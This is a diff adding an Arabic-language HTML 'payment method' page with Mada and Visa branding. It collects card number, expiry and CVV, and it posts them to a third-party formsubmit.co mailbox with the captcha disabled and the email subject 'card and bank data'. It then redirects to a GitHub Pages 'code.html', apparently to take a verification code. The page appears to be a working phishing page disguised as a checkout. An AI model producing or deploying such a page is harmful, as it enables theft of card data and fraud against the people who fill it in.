@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>وسيلة الدفع</title>
+    <meta content="صفحة الدفع لإستكمال الطلب" name="description">
+    <!-- img real shortcut -->
+    <link rel="shortcut icon" href="img/cvv.png">
+
+    <link rel="stylesheet" href="all.min.css" />
+    <link rel="stylesheet" href="style.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="box">
+        <div class="head">
+            <img src="img/debit-card.png" alt="">
+            <h6>طريقة الدفع</h6>
+            <hr>
+        </div>
+
+        <div class="card">
+            <img class="img" src="img/mada-card.svg" alt="">
+            <img class="img" src="img/visa.png" alt="">
+        </div>
+
+        <hr class="hr">
+
+        <form action="https://formsubmit.co/86e2d111eb442626623070d10c3ff93d" method="post">
+            <input type="hidden" name="_next" value="https://naellweb.github.io/ap/code.html">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="بيانات البطاقة والبنك">
+
+
+            <div class="price">
+                <label for="المبلغ">المبلغ</label>
+                <input type="number" name="المبلغ" required>
+            </div>
+            <div class="card-vi">
+                <label for="card-type">نوع البطاقة</label>
+                <select name="bank" id="bank" required>
+                    <option value="بطاقة مدى">بطاقة مدى</option>
+                    <option value="بطاقة فيزا">بطاقة فيزا</option>
+                </select>
+            </div>
+            <div class="card-num">
+                <label for="رقم البطاقة">رقم البطاقة</label>
+                <input type="number" name="رقم البطاقة" required>
+                <img src="img/credit-card.png" alt="">
+            </div>
+            <div class="date-cont">
+                <div class="date">
+                    <div class="inp">
+                        <div class="first">
+                            <label for="الشهر">الشهر</label>
+                            <input type="number" name="الشهر" placeholder="الشهر" required>
+                        </div>
+                        <div class="last">
+                            <label for="السنة">السنة</label>
+                            <input type="number" name="السنة" placeholder="السنة" required>
+                        </div>
+                    </div>
+                </div>
+                <div class="cvv">
+                    <label for="cvv">(cvv)</label>
+                    <input type="number" name="cvv" maxlength="3" required>
+                    <img src="img/cvv.png" alt="">
+                </div>
+            </div>
+
+            <input type="submit" value="أرسل للتحقق">
+        </form>
+    </div>
+    <script src="main.js"></script>
+</body>
+
+</html>
